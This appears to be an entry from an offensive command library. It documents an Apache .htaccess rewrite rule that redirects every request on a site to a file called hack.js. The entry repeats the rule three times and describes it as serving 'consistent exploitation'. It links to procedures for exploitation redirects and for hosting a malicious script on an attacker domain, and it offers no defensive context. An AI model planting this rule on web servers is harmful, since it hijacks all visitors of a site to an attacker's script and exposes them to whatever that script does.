---
data: |-
  RewriteEngine on
  RewriteCond %{REQUEST_URI} !^/hack.js$
  RewriteRule .* /hack.js [L,R=302]
tags:
  - redirect
  - apache
type: command
executor: apache
platforms:
  - Web
id: 2e893ecb-9c20-4e79-86a3-3b7d922ce94f
created_at: '2025-12-11T03:47:50.142Z'
updated_at: '2025-12-11T03:47:50.142Z'
verified: false
validated: true
submitted: true
---
# apache-htaccess-redirect

## Command

```apache
RewriteEngine on
RewriteCond %{REQUEST_URI} !^/hack.js$
RewriteRule .* /hack.js [L,R=302]
```

## Description

Configures Apache .htaccess to redirect all requests to a single hack.js file for consistent exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `L` | Last rule | Yes |
| `R=302` | Temporary redirect | Yes |
| `RewriteRule` | Redirects to hack.js | Yes |

## Examples

### Basic Usage

```apache
RewriteEngine on
RewriteCond %{REQUEST_URI} !^/hack.js$
RewriteRule .* /hack.js [L,R=302]
```

## Expected Output

All paths serve hack.js.

## Related

- [[procedures/Configure-Server-Redirects-for-Exploitation]]
- [[procedures/Host-Malicious-Script-on-Attacker-Domain]]
